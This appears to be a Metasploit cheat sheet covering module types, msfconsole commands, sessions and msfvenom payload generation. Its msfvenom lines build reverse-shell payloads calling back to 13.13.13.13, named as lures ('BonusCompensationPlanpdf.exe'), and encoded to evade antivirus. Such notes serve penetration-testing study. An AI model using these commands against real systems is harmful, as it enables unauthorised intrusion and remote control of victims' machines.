---
# Metasploit
---
The `Metasploit Project` is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute the exploit code. This exploit code can be custom-made by the user or taken from a database containing the latest already discovered and modularized exploits. The `Metasploit Framework` includes a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection. At its core, the `Metasploit Project` is a collection of commonly used tools that provide a complete environment for penetration testing and exploit development. Files usually located at `/usr/share/metasploit-framework`.

- **What is MS Module?**
A module is a piece of software that the Metasploit Framework uses to perform a task, such as exploiting or scanning a target. A module can be an exploit module, auxiliary module, or post-exploitation module.

## Architecture

1. **Auxiliary** - Any supporting module, such as scanners, crawlers and fuzzers.
2. **Encoders** - Will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them. 
3. **Evasion** - While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, “evasion” modules will try that, with more or less success.
4. **Exploits** - Exploits, neatly organized by target system.
5. **NOPs** -  `(No Operation code)` Keep the payload sizes consistent across exploit attempts.
6. **Payloads** - Payloads are codes that will run on the target system.
7. **Post** - Post modules would be useful in post-exploitation.
 
## Useful MSFconsole Commands

- **Specific Search**
```bash
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

- **Get more info about module**
```bash
info
```

- **MSF - Permanent Target Specification**
```bash
msf6 exploit(windows/smb/amogus) > setg RHOSTS 13.13.13.13
```

- **Show and Set Target for exploit**
```bash
msf6 exploit(windows/browser/goose) > show targets
...
msf6 exploit(windows/browser/goose) > set target 3
```

- **Searching for Specific Payload**
```bash
msf6 exploit(windows/smb/goose) > grep meterpreter grep reverse_tcp show payloads
```

- **Use Local Exploit Suggester**
```bash
msf6 > search local exploit suggester
```
## MSFvenom

**Msfvenom is a tool that is part of the Metasploit framework and it is a command line tool for generating different types of payloads for exploiting.** In addition to providing a payload with flexible delivery options, MSFvenom also allows us to `encrypt & encode` payloads to bypass common anti-virus detection signatures.
- **List Payloads**
```bash
msfvenom -l payloads
```
- **Building a Stageless Payload for Linux**
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=13.13.13.13 LPORT=443 -f elf > createbackup.elf
```
- **Building a Stageless Payload for Windows**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=13.13.13.13 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

### Staged vs Stageless Payloads
**`Staged` payloads create a way for us to send over more components of our attack.** So if more simply, the whole payload has few stages, first to get connection and others to load additional programs

**`Stageless` payloads do not have a stage.** So all payload and programs are loaded at first time.

## Meterpreter

`The Meterpreter` payload is a specific type of multi-faceted payload that uses `DLL injection` to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes. Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques.

## Encoder

- **Generating Payload - With Encoding**

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

- **List Encoders**

```bash
msf6 exploit(windows/smb/goose) > show encoders
```

- **MSF - VirusTotal**

```bash
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

## Sessions

- **Listing Active Sessions**

```bash
msf6 exploit(windows/smb/goose) > sessions
```

- **Interacting with a Session**

```bash
msf6 exploit(windows/smb/goose) > sessions -i 1
```

- **Backgrounding session**

```bash
meterpreter > background
OR
Ctrl+Z
OR
meterpreter > bg
```

- **Killing session**

```bash
msf6 exploit(windows/smb/goose) > sessions -k 1
```

- **Listing Running Jobs**

```bash
msf6 exploit(multi/handler) > jobs -l
```

- **Run an Exploit as a Background Job**

```bash
msf6 exploit(multi/handler) > exploit -j
```
